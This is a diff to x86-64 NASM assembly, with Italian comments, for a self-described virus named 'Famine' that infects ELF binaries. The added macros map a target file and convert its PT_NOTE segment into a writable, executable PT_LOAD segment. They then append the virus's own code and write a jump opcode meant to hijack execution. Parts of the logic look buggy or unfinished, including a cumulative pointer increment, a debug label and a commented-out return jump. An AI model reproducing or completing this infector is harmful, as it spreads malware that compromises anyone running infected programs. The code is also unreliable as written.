@@ -43,6 +43,16 @@
 	restore_regx
 %endmacro
 
+%macro writefd_my 3 ; puntatore stringa, len stringa, fd
+	save_regx
+	mov rdi, %3
+	mov rsi, %1
+	mov rdx, %2
+	mov rax, 0x01
+	syscall
+	restore_regx
+%endmacro
+
 %macro exit_my 1 ; exit code
 	mov rdi, %1
 	mov rax, 0x3c
@@ -222,6 +232,20 @@
 	restore_regx
 %endmacro
 
+%macro write_loop 3						; puntatore, size, fd
+	save_regx
+	mov rdx, %2
+	mov rsi, -1
+	mov rcx, %1
+	%%loop:
+		inc rsi
+		add rcx, rsi
+		writefd_my rcx, 1, %3
+		cmp rsi, rdx
+		jne %%loop
+	restore_regx
+%endmacro
+
 %macro infect 2							;nome del file con dir | nome del file senza dir
 	save_regx
 	strcmp_for_link_my %2				; per escludere '.' e '..'
@@ -234,30 +258,61 @@
 		cmp rax, -1
 		je %%end
 		mov r9, rax						; r9 = fd file
+		push r9
 		lseek_my r9, 0, 2
 		mov r10, rax					; r10 = size file
+		push r10
 		mmap_my 0, r10, 0x3, 0x1, r9, 0
 		cmp rax, -1
 		je %%end
 		mov r8, rax						; r8 = mmap file
 		mov r11, [r8 + ehdr.e_phoff]	; r11 = phdr
+		add r11, r8
 		xor r12, r12
 		mov r12w, [r8 + ehdr.e_phnum]	; r12 = phnum
 		mov rcx, -1
+		xor r13, r13
 		%%loop:
 			inc rcx
-			mov r13, [r11 + phdr.p_type]
-			cmp r13, 4	; controllo se è PT_NOTE
+			mov r13b, [r11 + phdr.p_type]
+			cmp r13, 4					; controllo se è PT_NOTE
 			je %%end_loop_trovato
-			add r11, 30
+			add r11, 56
 			cmp rcx, r12
 			jb %%loop
 		%%end_loop:
-			jmp end
-		%%end_loop_trovato:
+			jmp %%end
+		%%end_loop_trovato:						; r11 = puntatore PT_NOTE
+			pop r10
+			mov dword [r11 + phdr.p_type], 1 	; PT_LOAD
+			mov dword [r11 + phdr.p_flags], 7 	; PF_R | PF_X | PF_W
+			lea r13, [rel end]
+			lea rsi, [rel _start]
+			sub r13, rsi						; r13 = size payload
+			mov qword [r11 + phdr.p_offset], r10; size file
+			xor rsi, rsi
+			mov rsi, 0xc000000
+			add rsi, r10						; rsi = 0xc000000 + size
+			mov qword [r11 + phdr.p_vaddr], rsi	; 0xc000000 + size
+			add qword [r11 + phdr.p_filesz], r13; += size payload
+			add qword [r11 + phdr.p_memsz], r13 ; += size payload
+			xor rcx, rcx
+			mov ecx, dword [r8 + ehdr.e_entry]	; ecx = e_entry
+			sub ecx, esi						; -= p_vaddr
+			sub ecx, r13d						; -= size payload
+			; rcx = ecx = (uint32_t)offsetJump
+			lea rax, [rel _start]
+			pop r9
+			;sub r13, 823						; tolgo pad di zeri e jmp
+			write_loop rax, r13, r9
+			%%debug:
+			writefd_my insert_jmp, 1, r9		; scrivo opcode jmp
+
 			strlen_my %1
 			write_my %1, rax
+			write_my string_space, 2
 	%%end:
+		xor rax, rax
 		restore_regx
 %endmacro
 
@@ -327,8 +382,11 @@ string_dir2:
 string_debug:
 	db 'DEBUG', 0
 
+insert_jmp:
+	db 0xe9, 0
+
 firma:
 	db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00
 
 end:
-	jmp 0xffffffff
+	;jmp 0xffffffff
